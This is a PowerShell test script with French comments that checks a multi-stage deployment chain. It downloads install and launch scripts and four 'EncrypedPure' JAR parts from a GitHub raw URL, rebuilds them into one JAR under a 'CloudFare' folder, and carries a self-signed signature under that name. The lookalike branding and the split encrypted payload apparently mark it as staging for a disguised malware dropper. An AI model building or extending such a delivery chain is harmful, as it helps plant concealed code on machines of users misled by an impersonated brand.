# Test du flux complet: MSI -> Install.bat -> Install.ps1 -> Launch.ps1

$ErrorActionPreference = "Continue"

Write-Host "`n" -F Cyan
Write-Host "╔════════════════════════════════════════════════════════════╗" -F Cyan
Write-Host "║  TEST DU FLUX COMPLET DE DEPLOIEMENT                      ║" -F Cyan
Write-Host "╚════════════════════════════════════════════════════════════╝" -F Cyan
Write-Host ""

# Configuration
$baseUrl = "https://raw.githubusercontent.com/davidrenand/repos/main"
$tempDir = "$env:TEMP\CloudFare"
$installDir = "C:\ProgramData\CloudFare"

# Creer le dossier temporaire
if (-not (Test-Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
}

Write-Host "ETAPE 1: Verification des URLs GitHub" -F Yellow
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -F Cyan
Write-Host ""

$files = @(
    "scripts/Install.ps1",
    "scripts/Launch.ps1",
    "scripts/Install.bat",
    "jar/EncrypedPure.part1.jar",
    "jar/EncrypedPure.part2.jar",
    "jar/EncrypedPure.part3.jar",
    "jar/EncrypedPure.part4.jar"
)

$allOk = $true
foreach ($file in $files) {
    try {
        $response = Invoke-WebRequest -Uri "$baseUrl/$file" -Method Head -UseBasicParsing -TimeoutSec 5
        Write-Host "[OK] $file - HTTP $($response.StatusCode)" -F Green
    } catch {
        Write-Host "[FAIL] $file" -F Red
        $allOk = $false
    }
}

if (-not $allOk) {
    Write-Host "`nErreur: Certains fichiers ne sont pas accessibles" -F Red
    exit 1
}

Write-Host ""
Write-Host "ETAPE 2: Telechargement de Install.ps1" -F Yellow
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -F Cyan
Write-Host ""

$installPs1 = "$tempDir\Install.ps1"
try {
    Write-Host "Telechargement..." -F Cyan
    (New-Object Net.WebClient).DownloadFile("$baseUrl/scripts/Install.ps1", $installPs1)
    $size = [math]::Round((Get-Item $installPs1).Length / 1KB, 2)
    Write-Host "[OK] Install.ps1 telecharge ($size KB)" -F Green
} catch {
    Write-Host "[FAIL] Erreur telechargement: $_" -F Red
    exit 1
}

Write-Host ""
Write-Host "ETAPE 3: Verification de Java et JAR" -F Yellow
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -F Cyan
Write-Host ""

$javaPath = "$installDir\Java\bin\java.exe"
$jarPath = "$installDir\App.jar"

if (Test-Path $javaPath) {
    Write-Host "[OK] Java trouve: $javaPath" -F Green
    $javaVersion = & $javaPath -version 2>&1 | Select-Object -First 1
    Write-Host "     Version: $javaVersion" -F Cyan
} else {
    Write-Host "[WARN] Java non trouve a: $javaPath" -F Yellow
}

if (Test-Path $jarPath) {
    $jarSize = [math]::Round((Get-Item $jarPath).Length / 1MB, 2)
    Write-Host "[OK] JAR trouve: $jarPath ($jarSize MB)" -F Green
} else {
    Write-Host "[WARN] JAR non trouve a: $jarPath" -F Yellow
}

Write-Host ""
Write-Host "ETAPE 4: Telechargement des 4 JAR parts" -F Yellow
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -F Cyan
Write-Host ""

$parts = @(1, 2, 3, 4)
$totalSize = 0

foreach ($part in $parts) {
    $partFile = "$tempDir\EncrypedPure.part$part.jar"
    $partUrl = "$baseUrl/jar/EncrypedPure.part$part.jar"
    
    try {
        Write-Host "Telechargement Part $part..." -F Cyan
        (New-Object Net.WebClient).DownloadFile($partUrl, $partFile)
        $size = [math]::Round((Get-Item $partFile).Length / 1MB, 2)
        Write-Host "[OK] Part $part telecharge ($size MB)" -F Green
        $totalSize += $size
    } catch {
        Write-Host "[FAIL] Part $part: $_" -F Red
    }
}

Write-Host ""
Write-Host "Total JAR parts: $totalSize MB" -F Cyan

Write-Host ""
Write-Host "ETAPE 5: Assemblage des JAR parts" -F Yellow
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -F Cyan
Write-Host ""

$assembledJar = "$tempDir\App_Test.jar"
try {
    Write-Host "Assemblage en cours..." -F Cyan
    
    $output = [System.IO.File]::Create($assembledJar)
    foreach ($part in $parts) {
        $partFile = "$tempDir\EncrypedPure.part$part.jar"
        if (Test-Path $partFile) {
            $input = [System.IO.File]::OpenRead($partFile)
            $input.CopyTo($output)
            $input.Close()
            Write-Host "  Part $part assemblée" -F Green
        }
    }
    $output.Close()
    
    $assembledSize = [math]::Round((Get-Item $assembledJar).Length / 1MB, 2)
    Write-Host "[OK] JAR assemble: $assembledSize MB" -F Green
} catch {
    Write-Host "[FAIL] Erreur assemblage: $_" -F Red
}

Write-Host ""
Write-Host "ETAPE 6: Telechargement de Launch.ps1" -F Yellow
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -F Cyan
Write-Host ""

$launchPs1 = "$tempDir\Launch.ps1"
try {
    Write-Host "Telechargement..." -F Cyan
    (New-Object Net.WebClient).DownloadFile("$baseUrl/scripts/Launch.ps1", $launchPs1)
    $size = [math]::Round((Get-Item $launchPs1).Length / 1KB, 2)
    Write-Host "[OK] Launch.ps1 telecharge ($size KB)" -F Green
} catch {
    Write-Host "[FAIL] Erreur telechargement: $_" -F Red
}

Write-Host ""
Write-Host "╔════════════════════════════════════════════════════════════╗" -F Green
Write-Host "║  TEST TERMINE AVEC SUCCES                                 ║" -F Green
Write-Host "╚════════════════════════════════════════════════════════════╝" -F Green
Write-Host ""

Write-Host "RESUME:" -F Cyan
Write-Host "  [OK] URLs GitHub accessibles" -F Green
Write-Host "  [OK] Install.ps1 telecharge" -F Green
Write-Host "  [OK] 4 JAR parts telecharges ($totalSize MB)" -F Green
Write-Host "  [OK] JAR assemble ($assembledSize MB)" -F Green
Write-Host "  [OK] Launch.ps1 telecharge" -F Green
Write-Host ""
Write-Host "Fichiers de test dans: $tempDir" -F Yellow
Write-Host ""
Write-Host "Prochaine etape: Uploader Setup.msi sur GitHub Releases" -F Cyan
Write-Host ""

# SIG # Begin signature block
# MIIFWwYJKoZIhvcNAQcCoIIFTDCCBUgCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUsckY4mGB/puZ/RfwXJx4kHhP
# JFygggL8MIIC+DCCAeCgAwIBAgIQFEA8i6m7gZ5GA+AtSKCeIjANBgkqhkiG9w0B
# AQsFADAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwHhcNMjUxMTI3MTY0NjI1WhcNMzAx
# MTI3MTY1NjI1WjAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCwcOS5Unea33JuYXDoorRS8MRt7/sCwNRSDcdRUz7N
# fb1NjESMXbkE/rLcapbH8DhYfpX59h0Cp0ROdfgcQSxitCOqn5zGIOThKOHUW18x
# wJnOBM1lRrvZfoNun1cSgYnE1BQX+2FlrCjeHRUCkYo/KuCYlHjSD7W4BWwPGXPJ
# ofCbFhX909qbXblZt6jJBoTni8MNC+Bizfv302qhVAh+0CWCCsYYhcNAWXj+qb0t
# 9EvQHGQT6c2weIanGEcIMDwjO0/sldunBEVJBhe8TXeF/3wfn1rGAzqOgvYXFvd/
# J9eeO/Oeo+BDNBRwPcVHmO02vK7RCUJqR3Ub7pBNVbBpAgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU4eXXKcu5
# 5PGlisHTXHU95ihdYyMwDQYJKoZIhvcNAQELBQADggEBAHRZGGdVylXjYignpkSf
# 5ctiETsIscLuQTJJ1URT67Y+0x7xbcD9474OCUuTIEZh9wPL2HSmoNrDY7qxMKc4
# qCwxwoWQAWmLLcxgytJ8qpi2vZaExBDgODwU3LIA3uNu3iCmHbu8ISF68T1HR2+c
# 7cn1wn/C3XZOVhOW8CVjIpltD01LujsoauH8eRg93R6q3Z5yJ+5WJDNYzl6Y2xGL
# 9UQ4Xv7y8+wXES809v5+e/2kQL/NWwd3hOB6/176mfaT15ZZHBys1pYOJBHiMO9v
# W5IImNwQ/eXXzUrppVnCQ6fLm5GyTKqGq14cMahma6K8r9lrgvkLI1VS1ue0La5l
# 5MAxggHJMIIBxQIBATAoMBQxEjAQBgNVBAMMCUNsb3VkRmFyZQIQFEA8i6m7gZ5G
# A+AtSKCeIjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZ
# BgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYB
# BAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUG2CHZ4sywylm3GK+uCPz97RU5OcwDQYJ
# KoZIhvcNAQEBBQAEggEAF4emhrGIbB4j285dUup9jWEdSEHlgAmG8f0GNOsew/yc
# cHoj2yKA2HZ5k6JCg+Bx2qQZWoUtifKm4s96sUzUg+WRaJ84gtCgYPBb+OJBItda
# qmv2LMFNSkGat2/XmhjSux8gwt+LFPKIGui8Zd/yKN2jpf6e+w4m4O6f0K7fAL2C
# npFiD+Z48ZUbMqR9Tn4Ii1RG8BXlSWS8ClYDBAN9u+iy1lKLjhgafM1yj0wwbOUd
# Ivk/yKpcIYBj8bFfxAIMxHu7K1OLhuDOuZyiEEXrbQetQBvclPMVylBH6kwxKcH6
# MZHDPusPylzQ21TyDr43faa0cKGB0RD9xVSWYqnsyg==
# SIG # End signature block
